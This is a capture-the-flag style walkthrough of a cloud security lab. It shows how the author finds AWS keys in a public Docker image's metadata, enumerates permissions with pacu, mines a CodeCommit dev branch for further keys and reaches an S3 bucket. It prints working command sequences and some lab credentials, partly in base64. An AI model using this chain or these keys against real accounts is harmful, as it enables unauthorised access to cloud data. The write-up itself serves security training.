https://app.pwnedlabs.io/labs/uncover-secrets-in-codecommit-and-docker

### Scenario

Huge Logistics has engaged your team for a security assessment. Your primary objective is to scrutinize their public repositories for overlooked credentials or sensitive information. If you discover any, use them to gain initial access to their cloud infrastructure. From there, focus on lateral and vertical movement to demonstrate impact. Your aim is to identify any security gaps so they can be closed off.

### Information provided

```
https://hub.docker.com/search
```

We have been provided only the link to docker hub which is a registry of containers.

### Enumeration

Since we have been provided with a link to the docker hub registry, we have to look for publicly available container images using the clues in the scenario. Since the name of the org is `Huge Logistics`, we will try to search using that name itself.

![](Pasted%20image%2020260927140404.png)

We found an image that looks related to this organization. Lets pull it using the command given in the bottom right.

```
docker pull hljose/huge-logistics-terraform-runner:0.12
```

```
0.12: Pulling from hljose/huge-logistics-terraform-runner
31e352740f53: Pull complete 
733c1bd26773: Pull complete 
3ee224966b84: Pull complete 
661b6e1c6136: Pull complete 
e3f8a0cccb2d: Pull complete 
dc8d5954d00c: Pull complete 
1630fa498485: Pull complete 
Digest: sha256:9f2719775ca8537023b9f1c126a2b36d6b59998d9e54e3d2e0b87b0d80e75707
Status: Downloaded newer image for hljose/huge-logistics-terraform-runner:0.12
docker.io/hljose/huge-logistics-terraform-runner:0.12
```

Lets log in to the terminal of the container and check if we can find anything interesting.

```
cat passwd 
```

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

We do not see anything interesting inside the container. And it is not possible to manually scan the directories present inside the image.

### Container scanning

To automate the process of container scanning, we will use `trivy`. It is used to find secrets and vulns in the layers of the container image.

```
trivy image hljose/huge-logistics-terraform-runner:0.12
```

```

hljose/huge-logistics-terraform-runner:0.12 (secrets)

Total: 16 (UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 0, CRITICAL: 16)

CRITICAL: AWS (aws-access-key-id)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Access Key ID
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:106 (offset: 6566 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 104     "Env": [
 105     "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
 106 [   "AWS_ACCESS_KEY_ID=********************",
 107     "AWS_SECRET_ACCESS_KEY=****************************************",
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


CRITICAL: AWS (aws-access-key-id)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Access Key ID
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:40 (offset: 1190 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  38     {
  39     "created": "2023-07-19T22:23:21Z",
  40 [ d_by": "ENV AWS_ACCESS_KEY_ID=******************** AWS_SECRET_ACCESS_K
  41     "comment": "buildkit.dockerfile.v0",
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


CRITICAL: AWS (aws-access-key-id)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Access Key ID
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:46 (offset: 1454 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  44     {
  45     "created": "2023-07-19T22:23:21Z",
  46 [ y": "RUN |3 AWS_ACCESS_KEY_ID=******************** AWS_SECRET_ACCESS_K
  47     "comment": "buildkit.dockerfile.v0"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


CRITICAL: AWS (aws-access-key-id)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Access Key ID
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:51 (offset: 1867 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  49     {
  50     "created": "2023-07-19T22:23:52Z",
  51 [ y": "RUN |3 AWS_ACCESS_KEY_ID=******************** AWS_SECRET_ACCESS_K
  52     "comment": "buildkit.dockerfile.v0"


──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:107 (offset: 6614 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 105     "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
 106     "AWS_ACCESS_KEY_ID=********************",
 107 [   "AWS_SECRET_ACCESS_KEY=****************************************",
 108     "AWS_DEFAULT_REGION=us-east-1"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


CRITICAL: AWS (aws-secret-access-key)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Secret Access Key
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:40 (offset: 1233 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  38     {
  39     "created": "2023-07-19T22:23:21Z",
  40 [ ******* AWS_SECRET_ACCESS_KEY=**************************************** AWS_DEFAULT_REGION=
  41     "comment": "buildkit.dockerfile.v0",
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


CRITICAL: AWS (aws-secret-access-key)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Secret Access Key
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:51 (offset: 1910 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:56 (offset: 2260 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  54     {
  55     "created": "2023-07-19T22:23:53Z",
  56 [ ******* AWS_SECRET_ACCESS_KEY=**************************************** AWS_DEFAULT_REGION=
  57     "comment": "buildkit.dockerfile.v0"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


CRITICAL: AWS (aws-secret-access-key)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Secret Access Key
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:61 (offset: 2665 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  59     {
  60     "created": "2023-07-19T22:23:53Z",
  61 [ ******* AWS_SECRET_ACCESS_KEY=**************************************** AWS_DEFAULT_REGION=
  62     "comment": "buildkit.dockerfile.v0"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


CRITICAL: AWS (aws-secret-access-key)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Secret Access Key
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:66 (offset: 3796 bytes)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  64     {
  65     "created": "2023-07-19T22:23:54Z",
  66 [ ******* AWS_SECRET_ACCESS_KEY=**************************************** AWS_DEFAULT_REGION=
  67     "comment": "buildkit.dockerfile.v0"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


CRITICAL: AWS (aws-secret-access-key)
══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
AWS Secret Access Key
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 hljose/huge-logistics-terraform-runner:0.12:71 (offset: 4489 bytes)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  44     {
  45     "created": "2023-07-19T22:23:21Z",
  46 [ ******* AWS_SECRET_ACCESS_KEY=**************************************** AWS_DEFAULT_REGION=
  47     "comment": "buildkit.dockerfile.v0"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

Note :- The actual output is very wordy and long, I have shortened the output in the writeup.

As we can see in the above output, there are some leaked credentials present in the scan output however they have been redacted by `trivy` by default.

Doing a quick google search told me that this information was present inside the metadata of the container image. The clue for this was the `env` variables which are being set in the output of the scan.

Lets take a look at the metadata of the container image.

```
docker inspect hljose/huge-logistics-terraform-runner:0.12
```

```
[
    {
        "Id": "sha256:31bd0544dff85f0a97bd52a724215e77244733a3f51fe051928009da08df1de9",
        "RepoTags": [
            "hljose/huge-logistics-terraform-runner:0.12"
        ],
        "RepoDigests": [
            "hljose/huge-logistics-terraform-runner@sha256:9f2719775ca8537023b9f1c126a2b36d6b59998d9e54e3d2e0b87b0d80e75707"
        ],
        "Comment": "buildkit.dockerfile.v0",
        "Created": "2023-07-19T23:23:54.871976062+01:00",
        "Config": {
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "AWS_ACCESS_KEY_ID=AKIA3<REDACTED>",
                "AWS_SECRET_ACCESS_KEY=iupVtWDRuA<REDACTED>",
                "AWS_DEFAULT_REGION=us-east-1"
            ],
            "Cmd": [
                "/bin/bash"
            ],
            "Volumes": {
                "/workspace": {}
            },
            "Labels": {
                "description": "Feature-packed DevOps Docker image with AWS, Azure, GCP CLI tools, Terraform, and common utilities.",
                "maintainer": "jose@huge-logistics.com"
            },
            "ArgsEscaped": true
        },
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 186242550,
        "GraphDriver": {
            "Data": {
                "LowerDir": "/var/lib/docker/overlay2/89985ff87ac27e8337fdeae88731a8bd8e4d4435609bcccaa9f69f01c208db94/diff:/var/lib/docker/overlay2/4bab753a148131e3af7afc928a4b0fb3eacdcdeab910caf30f8c9c358e9a63b1/diff:/var/lib/docker/overlay2/51ac278ec0d614a565440e6f223a9e54ec333ea724c2e9a62bfee06419467167/diff:/var/lib/docker/overlay2/9e955dde67b7014e506fbbdd4bf0c834f264aa50e8635ba98761063114170be4/diff:/var/lib/docker/overlay2/d301131b5bf81b6b4b198363900dd3b763c34cc57d0c21b681c42abf37b1de5c/diff:/var/lib/docker/overlay2/662f40660093c6cec140693ec2100d926aab22f4135e945435835cfb1caa71df/diff",
                "MergedDir": "/var/lib/docker/overlay2/6f297970fca2c5f80c8b7f4ba840e96dfab5a1fb6597950b05abf6be84bd09ff/merged",
                "UpperDir": "/var/lib/docker/overlay2/6f297970fca2c5f80c8b7f4ba840e96dfab5a1fb6597950b05abf6be84bd09ff/diff",
                "WorkDir": "/var/lib/docker/overlay2/6f297970fca2c5f80c8b7f4ba840e96dfab5a1fb6597950b05abf6be84bd09ff/work"
            },
            "Name": "overlay2"
        },
        "RootFS": {
            "Type": "layers",
            "Layers": [
                "sha256:78a822fe2a2d2c84f3de4a403188c45f623017d6a4521d23047c9fbb0801794c",
                "sha256:88bfaadddaddac325d2e71e6760e1698a4fdec3c947fa77c7b4abef811db2c54",
                "sha256:4fc792d16ae659e58057018a756041d49fe274a5de54eca061d2e43fbf8f914f",
                "sha256:c35cd37e3764b5f1145e40bb6ebdfa2ac802b21bf32774c0d7e1f9e7d032fa55",
                "sha256:82a092b4158a59ad60207d431ed23f92052f40bdf5915455c447af7631a49145",
                "sha256:3481758aa53e6457386d577fd74246864666bcd1a529f195d1c93795e9142845",
                "sha256:754be1c48fe33fa805d770d560c07ea5b43bbd58eb7c2fc36e25fbf0da8fe587"
            ]
        },
        "Metadata": {
            "LastTagTime": "0001-01-01T00:00:00Z"
        }
    }
]
```

As we can see, there are credentials present inside the metadata which we can use!

### AWS enumeration

```
aws sts get-caller-identity --profile docker_user
```

```
{
    "UserId": "AIDA3NRSK2PTAUXNEJTBN",
    "Account": "785010840550",
    "Arn": "arn:aws:iam::785010840550:user/prod-deploy"
}
```

After configuring the credentials we are able to login as the `prod-deploy` user in the CLI. I tried running some basic commands for `IAM` but we are not authorized to do it. I will use `pacu` to brute-force the permissions in `IAM`.

```
use iam__bruteforce_permissions --region us-east-1
```

```
  Running module iam__bruteforce_permissions...
[iam__bruteforce_permissions] Enumerated IAM Permissions:
[iam__bruteforce_permissions] Enumerating us-east-1
2026-09-26 20:59:08,798 - 17797 - [INFO] Starting permission enumeration for access-key-id "AKIA3NRSK2PTOA5KVIUF"
2026-09-26 20:59:10,450 - 17797 - [INFO] -- Account ARN : arn:aws:iam::785010840550:user/prod-deploy
2026-09-26 20:59:10,450 - 17797 - [INFO] -- Account Id  : 785010840550
2026-09-26 20:59:10,450 - 17797 - [INFO] -- Account Path: user/prod-deploy
2026-09-26 20:59:10,932 - 17797 - [INFO] Attempting common-service describe / list brute force.
2026-09-26 20:59:16,474 - 17797 - [ERROR] Remove globalaccelerator.describe_accelerator_attributes action
2026-09-26 20:59:31,727 - 17797 - [INFO] -- codecommit.list_repositories() worked!
2026-09-26 20:59:35,581 - 17797 - [INFO] -- sts.get_caller_identity() worked!
2026-09-26 20:59:36,062 - 17797 - [INFO] -- sts.get_session_token() worked!
2026-09-26 20:59:39,894 - 17797 - [INFO] -- dynamodb.describe_endpoints() worked!
[iam__bruteforce_permissions] iam:
[iam__bruteforce_permissions]   root_account: False
[iam__bruteforce_permissions]   arn: arn:aws:iam::785010840550:user/prod-deploy
[iam__bruteforce_permissions]   arn_id: 785010840550
[iam__bruteforce_permissions]   arn_path: user/prod-deploy
[iam__bruteforce_permissions] bruteforce:
[iam__bruteforce_permissions]   codecommit.list_repositories: {'repositories': [{'repositoryName': 'vessel-tracking', 'repositoryId': 'beb7df6c-e3a2-4094-8fc5-44451afc38d3'}]}
[iam__bruteforce_permissions]   sts.get_caller_identity: {'UserId': 'AIDA3NRSK2PTAUXNEJTBN', 'Account': '785010840550', 'Arn': 'arn:aws:iam::785010840550:user/prod-deploy'}
[iam__bruteforce_permissions]   sts.get_session_token: {'Credentials': {'AccessKeyId': 'ASIA3<REDACTED>', 'SecretAccessKey': '1IFRtFGyPubmadYu/GjzMCQ8xcuL4wQdZxqdGd+S', 'SessionToken': 'FwoGZXIvYXdzEFEaDE6Mek0SuXoal9OPQyKCAcwdxCOcInHzomIpgncdXsuqCK+2yUdrdDKGteN7t/zGuRdsUEkPizk+7DUfxQDrQO0qyw<REDACTED>=', 'Expiration': datetime.datetime(2026, 9, 27, 3, 29, 35, tzinfo=tzutc())}}
[iam__bruteforce_permissions]   dynamodb.describe_endpoints: {'Endpoints': [{'Address': 'dynamodb.us-east-1.amazonaws.com', 'CachePeriodInMinutes': 1440}]}
[iam__bruteforce_permissions] iam__bruteforce_permissions completed.

[iam__bruteforce_permissions] MODULE SUMMARY:

Num of IAM permissions found: 4 
```

We can then list the permissions we have with the following command inside `pacu`:-

```
Pacu (docker_user:imported-docker_user) > whoami
```

```
{
  "UserName": null,
  "RoleName": null,
  "Arn": null,
  "AccountId": null,
  "UserId": null,
  "Roles": null,
  "Groups": null,
  "Policies": null,
  "AccessKeyId": "AKIA3NRSK2PTOA5KVIUF",
  "SecretAccessKey": "iupVtWDRuAvxWZQRS8fk********************",
  "SessionToken": null,
  "KeyAlias": "imported-docker_user",
  "PermissionsConfirmed": null,
  "Permissions": {
    "Allow": [
      "codecommit:ListRepositories",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "dynamodb:DescribeEndpoints"
    ],
    "Deny": []
  }
}
```

Out of all the permissions mentioned, the `codecommit:ListRepositories` looks very interesting. Lets try to enumerate further using that.

```
aws codecommit list-repositories --profile docker_user
```

```
{
    "repositories": [
        {
            "repositoryName": "vessel-tracking",
            "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3"
        }
    ]
}
```

This above command list the repos present inside the AWS environment. We will use the reference of this repo to dig deeper.

```
aws codecommit get-repository --repository-name vessel-tracking --profile docker_user
```

```
{
    "repositoryMetadata": {
        "accountId": "785010840550",
        "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3",
        "repositoryName": "vessel-tracking",
        "repositoryDescription": "Vessel Tracking App",
        "defaultBranch": "master",
        "lastModifiedDate": "2023-07-20T23:20:46.826000+05:30",
        "creationDate": "2023-07-20T02:41:19.845000+05:30",
        "cloneUrlHttp": "https://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "cloneUrlSsh": "ssh://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "Arn": "arn:aws:codecommit:us-east-1:785010840550:vessel-tracking",
        "kmsKeyId": "alias/aws/codecommit"
    }
}
```

The above command provides more details regarding the repository in question. We have some useful information like the `defaultBranch` and `kmsKeyId`. 

Lets try enumerating the `master` branch which is the default branch mentioned.

```
aws codecommit get-branch --repository-name vessel-tracking --branch-name master --profile docker_user
```

```
{
    "branch": {
        "branchName": "master",
        "commitId": "8f355a0fedcdf3a9764c4388fd825bd1f5a30818"
    }
}
```

This shows is the commits made to the `master` branch. We can use this commit ID to get more information about the commit.

```
aws codecommit get-commit --repository-name vessel-tracking --commit-id 8f355a0fedcdf3a9764c4388fd825bd1f5a30818 --profile docker_user
```

```
{
    "commit": {
        "commitId": "8f355a0fedcdf3a9764c4388fd825bd1f5a30818",
        "treeId": "8e2d7f189e4cc072594bdf1a222033990ec1d7b1",
        "parents": [],
        "message": "Initial Commit\n",
        "author": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689872643 +0100"
        },
        "committer": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689872643 +0100"
        },
        "additionalData": ""
    }
}
```

We can see the comments, author, time and date and some more information regarding the mentioned commit.

```
aws codecommit get-differences --repository-name vessel-tracking --after-commit-specifier 8f355a0fedcdf3a9764c4388fd825bd1f5a30818 --profile docker_user
```

```
{
    "differences": [
        {
            "afterBlob": {
                "blobId": "fa55c202e1e8c3557c9c9acd3fba6553749f175a",
                "path": "css/bootstrap.css",
                "mode": "100755"
            },
            "changeType": "A"
        },
        {
            "afterBlob": {
                "blobId": "ad65b4ed312be80fa155062851b6b8abb42340b5",
                "path": "css/bootstrap.min.css",
                "mode": "100755"
            },
            "changeType": "A"
        },
        {
            "afterBlob": {
                "blobId": "f1bfade31e5dc4a990895fe70d4ffebb239fe900",
                "path": "css/default.css",
                "mode": "100755"
            },
            "changeType": "A"
        },
        {
            "afterBlob": {
                "blobId": "791932b87eaf66880091c17590ddec8e0daaa52d",
                "path": "css/github.css",
                "mode": "100755"
            },
            "changeType": "A"
        },
        ---------------
        ---------------
        ---------------
```

Note:- The entire output has not been pasted, it is actually very long.

The above command gives us information about the file/blob added, modified or deleted during the commit we mention. It looks very messy, lets modify the command for cleaner output:-

```
aws codecommit get-differences --repository-name vessel-tracking --after-commit-specifier 8f355a0fedcdf3a9764c4388fd825bd1f5a30818 --query 'differences[*].[afterBlob.path, beforeBlob.path]' --output text --profile docker_user | tr '\t' '\n' | grep -v '^None$' | sort -u
```

```
css/bootstrap.css
css/bootstrap.min.css
css/default.css
css/github.css
css/mdb.css
css/mdb.min.css
css/popup.css
font/roboto/Roboto-Bold.eot
font/roboto/Roboto-Bold.ttf
font/roboto/Roboto-Bold.woff
font/roboto/Roboto-Bold.woff2
font/roboto/Roboto-Light.eot
font/roboto/Roboto-Light.ttf
font/roboto/Roboto-Light.woff
font/roboto/Roboto-Light.woff2
font/roboto/Roboto-Medium.eot
font/roboto/Roboto-Medium.ttf
font/roboto/Roboto-Medium.woff
font/roboto/Roboto-Medium.woff2
font/roboto/Roboto-Regular.eot
font/roboto/Roboto-Regular.ttf
font/roboto/Roboto-Regular.woff
font/roboto/Roboto-Regular.woff2
font/roboto/Roboto-Thin.eot
font/roboto/Roboto-Thin.ttf
font/roboto/Roboto-Thin.woff
font/roboto/Roboto-Thin.woff2
img/anchor_lg.png
img/anchor.png
img/dot.png
img/overlays/01.png
img/overlays/02.png
img/overlays/03.png
img/overlays/04.png
img/overlays/05.png
img/overlays/06.png
img/overlays/07.png
img/overlays/08.png
img/overlays/09.png
img/svg/arrow_left.svg
img/svg/arrow_right.svg
index.html
js/bootstrap.js
js/bootstrap.min.js
js/highlight.pack.js
js/jquery-3.1.1.min.js
js/jquery-3.2.1.min.js
js/mdb.js
js/mdb.min.js
js/popper.min.js
js/popup.js
sass/mdb/_custom.scss
sass/mdb/free/_animations.scss
sass/mdb/free/_badge.scss
sass/mdb/free/_breadcrumb.scss
sass/mdb/free/_buttons.scss
sass/mdb/free/_cards-basic.scss
sass/mdb/free/_carousel-basic.scss
sass/mdb/free/_collapse.scss
sass/mdb/free/data/_colors.scss
sass/mdb/free/data/_functions.scss
sass/mdb/free/data/_mixins.scss
sass/mdb/free/data/_prefixer.scss
sass/mdb/free/data/_variables-b4.scss
sass/mdb/free/data/_variables.scss
sass/mdb/free/_deprecated.scss
sass/mdb/free/_dropdowns.scss
sass/mdb/free/_footer.scss
sass/mdb/free/_forms-basic.scss
sass/mdb/free/_global.scss
sass/mdb/free/_helpers.scss
sass/mdb/free/_jumbotron.scss
sass/mdb/free/_list-group.scss
sass/mdb/free/_masks.scss
sass/mdb/free/_modals.scss
sass/mdb/free/_msc.scss
sass/mdb/free/_navbar.scss
sass/mdb/free/_pagination.scss
sass/mdb/free/_progress.scss
sass/mdb/free/_tables.scss
sass/mdb/free/_typography.scss
sass/mdb/free/_waves.scss
sass/mdb.scss
```

This command lists only the names of the blobs. Looking at this at first glance, no file seems suspicious. We must be missing something.

```
aws codecommit get-comments-for-compared-commit --repository-name vessel-tracking --after-commit-id 8f355a0fedcdf
3a9764c4388fd825bd1f5a30818 --profile docker_user
```

```
{
    "commentsForComparedCommitData": []
}
```

There are no comments present as well. Let us check if there are any additional branches present inside the repo.

```
aws codecommit list-branches --repository-name vessel-tracking --profile docker_user
```

```
{
    "branches": [
        "master",
        "dev"
    ]
}
```

Great! We find that there is a different branch present. We do not have permissions to list the merge requests, lets enumerate this `dev` branch further.

```
aws codecommit get-branch --repository-name vessel-tracking --branch-name dev --profile docker_user
```

```
{
    "branch": {
        "branchName": "dev",
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a"
    }
}
```

We find the commit ID related to the `dev` branch, lets look at its details.

```
aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a --profile docker_user
```

```
{
    "commit": {
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
        "treeId": "5718a0915f230aa9dd0292e7f311cb53562bb885",
        "parents": [
            "2272b1b6860912aa3b042caf9ee3aaef58b19cb1"
        ],
        "message": "Allow S3 call to work universally\n",
        "author": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "committer": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "additionalData": ""
    }
}
```

Here we can see in the `message` key, the message value is giving us some clues related to a public S3 bucket.

Let us look at the differences between the 2 commits. The first one will be of the `master` branch where are files were added for the first time. Second commit will be of the `dev` branch.

```
aws codecommit get-differences --repository-name vessel-tracking --before-commit-specifier 8f355a0fedcdf3a9764c4388fd825bd1f5a30818 --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a  --profile docker_user
```

```
{
    "differences": [
        {
            "beforeBlob": {
                "blobId": "d09fe0b9d5c789673e0105201787e5831a1e5bd6",
                "path": "index.html",
                "mode": "100755"
            },
            "afterBlob": {
                "blobId": "11651198c05a2a8f9d8bb2317ccaac28abff39c2",
                "path": "index.html",
                "mode": "100755"
            },
            "changeType": "M"
        },
        {
            "afterBlob": {
                "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
                "path": "js/server.js",
                "mode": "100644"
            },
            "changeType": "A"
        }
    ]
}
```

Here we can see that a file named `js/server.js` was added and the `index.html` file was modified. Lets look at the contents of the newly added file.

```
aws codecommit get-blob --repository-name vessel-tracking --blob-id 39bb76cad12f9f622b3c29c1d07c140e5292a276 --profile docker_user
```

```
{
    "content": "Y29uc3QgZXhwcmVzcyA9IHJlcXVpcmUoJ2V4cHJlc3MnKTsKY29uc3QgYXhpb3MgPSByZXF1aXJlKCdheGlvcycpOwpjb25zdCBBV1MgPSByZXF1aXJlKCdhd3Mtc2RrJyk7CmNvbnN0IHsgdjQ6IHV1aWR2NCB9ID0gcmVxdWlyZSgndXVpZCcpOwpyZXF1aXJlKCdkb3RlbnYnKS5jb25maWcoKTsKCmNvbnN0IGFwcCA9IGV4cHJlc3MoKTsKY29uc3QgUE9SVCA9IHByb2Nlc3MuZW52LlBPUlQgfHwgMzAwMDsKCi8vIEFXUyBTZXR1cApjb25zdCBBV1NfQUNDRVNTX0tFWSA9ICdBS0lBM05SU0syUFRMR0FXV0xURyc7CmNvbnN0IEFXU19TRUNSRVRfS0VZID0gJzJ3Vnd3NVZFQWM2NWVXV21oc3VVVXZGRVRUNyt5bVlHTGptZUNoYXMnOwoKQVdTLmNvbmZpZy51cGRhdGUoewogICAgcmVnaW9uOiAndXMtZWFzdC0xJywgIC8vIENoYW5nZSB0byB5b3VyIHJlZ2lvbgogICAgYWNjZXNzS2V5SWQ6IEFXU19BQ0NFU1NfS0VZLAogICAgc2VjcmV0QWNjZXNzS2V5OiBBV1NfU0VDUkVUX0tFWQp9KTsKY29uc3QgczMgPSBuZXc<REDACTED>"
}
```

The content is present in base64 encoded format, we can decode it using `cyberchef`.

```
const express = require('express');
const axios = require('axios');
const AWS = require('aws-sdk');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// AWS Setup
const AWS_ACCESS_KEY = 'AKIA3N<REDACTED>';
const AWS_SECRET_KEY = '2wVww5VEAc65eWWmhs<REDACTED>';

AWS.config.update({
    region: 'us-east-1',  // Change to your region
    accessKeyId: AWS_ACCESS_KEY,
    secretAccessKey: AWS_SECRET_KEY
});
const s3 = new AWS.S3();

app.use((req, res, next) => {
    // Generate a request ID
    req.requestID = uuidv4();
    next();
});

app.get('/vessel/:mssi', async (req, res) => {
    try {
        const mssi = req.params.mssi;

        // Fetch data from MarineTraffic API
        let response = await axios.get(`https://api.marinetraffic.com/vessel/${mssi}`, {
            headers: { 'Api-Key': process.env.MARINE_API_KEY }
        });

        let data = response.data; // Modify as per actual API response structure

        // Upload to S3
        let params = {
            Bucket: 'vess<REDACTED>',
            Key: `${mssi}.json`,
            Body: JSON.stringify(data),
            ContentType: "application/json"
        };

        s3.putObject(params, function (err, s3data) {
            if (err) return res.status(500).json(err);
            
            // Send data to frontend
            res.json({
                data,
                requestID: req.requestID
            });
        });

    } catch (error) {
        res.status(500).json({ error: "Error fetching vessel data." });
    }
});

app.listen(PORT, () => {
    console.log(`Server is running on PORT ${PORT}`);
});
```

In the decoded output, we can see very interesting information. `AWS access key`, `Secret access key` and `bucket name` have been provided. This matches the clues from earlier regarding a public `S3` bucket.

### Privilege escalation and Data exflitration

Now that we have new credentials, we will try logging into the AWS CLI using those:-

```
aws sts get-caller-identity --profile docker_user_2
```

```
{
    "UserId": "AIDA3NR<REDACTED>",
    "Account": "7850<REDACTED>",
    "Arn": "arn:aws:iam::785010840550:user/code-admin"
}
```

We have now logged in as the `code-admin` user. Lets try to access that S3 bucket mentioned.

```
aws s3 ls s3://vess<REDACTED> --profile docker_user_2
```

```
2023-07-20 23:55:17         32 flag.txt
2023-07-21 00:05:56      21810 vessel-id-ae
2023-07-21 00:05:57      21770 vessel-id-af
2023-07-21 00:05:58      21515 vessel-id-ag
2023-07-21 00:05:58      21639 vessel-id-ah
2023-07-21 00:05:59      21568 vessel-id-ai
2023-07-21 00:06:00      21813 vessel-id-aj
